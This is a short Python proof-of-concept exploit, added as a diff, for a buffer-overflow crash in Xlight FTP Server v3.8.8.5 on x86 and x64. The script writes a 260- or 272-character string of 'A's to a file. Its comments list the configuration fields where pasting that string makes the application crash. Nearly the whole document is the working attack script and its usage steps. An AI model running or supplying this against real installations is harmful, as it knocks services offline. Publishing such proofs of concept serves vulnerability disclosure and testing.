@@ -1,0 +1,38 @@
+#!/usr/bin/python
+#
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Exploit Title: Xlight FTP Server (x86/x64) - Buffer Overflow Crash (PoC)
+# Date: 07-11-2017
+# Vulnerable Software: Xlight FTP Server v3.8.8.5 (x86/x64)
+# Vendor Homepage: http://www.xlightftpd.com/
+# Version: v3.8.8.5 (x86/x64)
+# Software Link: http://www.xlightftpd.com/download/
+# Tested On: Windows 7 x64
+#
+#
+# PoC: generate crash.txt, copy contents to clipboard, paste in any of the vulnerable fields
+#
+# 1. Generate crash.txt, open, and copy contents to clipboard
+# 2. In Xlight Server, open Global Options > Log > Session Log - Advanced Options > Setup
+# 3. Select Filtering log by users > Setup 
+# 4. Add User
+# 5. Paste crash.txt contents
+# 6. Application crashes
+#
+# Additional vulnerable fields:
+# Global Options > Log > Session Log - Advanced Options > Setup > Filtering log by groups > Setup > Add Group
+# Virtual Server > Modify Virtual Server Configuration > Advanced > Misc > Execute a program after user logged in > Setup
+#
+#
+  
+file="crash.txt"
+#file="crash64.txt"
+
+crash = "A"*260  		#crashes on 260 for x86, but more will do
+#crash64 = "A"*272		#crashes on 272 for x64, but more will do
+ 
+writeFile = open (file, "w")
+writeFile.write( crash )
+#writeFile.write( crash64 )
+writeFile.close()        
